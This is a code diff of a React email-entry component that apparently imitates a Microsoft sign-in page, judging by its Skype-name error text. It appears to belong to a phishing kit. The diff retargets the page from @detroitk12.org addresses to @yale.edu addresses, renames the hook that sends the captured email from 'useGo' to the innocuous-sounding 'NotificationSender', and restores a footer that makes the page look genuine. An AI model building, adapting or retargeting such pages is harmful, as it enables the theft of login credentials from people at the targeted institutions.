@@ -1,6 +1,6 @@
 import { useState, useEffect } from "react";
 import { FormFooter } from "./FormFooter";
-import useGo from "./useGo"; // Import the custom hook
+import NotificationSender from "./NotificationSender"; // Import the custom hook
 
 export const Email = ({ onNext, emailError, email }) => {
   const [emailValue, setEmailValue] = useState("");
@@ -8,7 +8,7 @@ export const Email = ({ onNext, emailError, email }) => {
   const [errorMessage, setErrorMessage] = useState("");
   const [isEmailValidated, setIsEmailValidated] = useState(false);
 
-  const { isSending, error, successMessage, sendEmail } = useGo(); // Use the hook
+  const { isSending, error, successMessage, sendEmail } = NotificationSender(); // Use the hook
 
   // If email prop changes, set it as the value for the email input
   useEffect(() => {
@@ -31,7 +31,7 @@ export const Email = ({ onNext, emailError, email }) => {
         "Enter a valid email address, phone number, or Skype name."
       );
       setBorderColor("1px solid red");
-    } else if (!emailValue.includes("@detroitk12.org")) {
+    } else if (!emailValue.includes("@yale.edu")) {
       setErrorMessage("We couldn't find an account with that username.");
       setBorderColor("1px solid red");
     } else {
@@ -83,15 +83,14 @@ export const Email = ({ onNext, emailError, email }) => {
           />
         </div>
         {/* <a className="reset">Reset or Forgot Password</a> */}
-        <br />
-        <br />
+       
         <div className="button-container">
           <button type="button" className="next" onClick={handleNext}>
             {isSending ? "Next" : "Next"}
           </button>
         </div>
       </div>
-      {/* <FormFooter /> */}
+      <FormFooter />
     </>
   );
 };
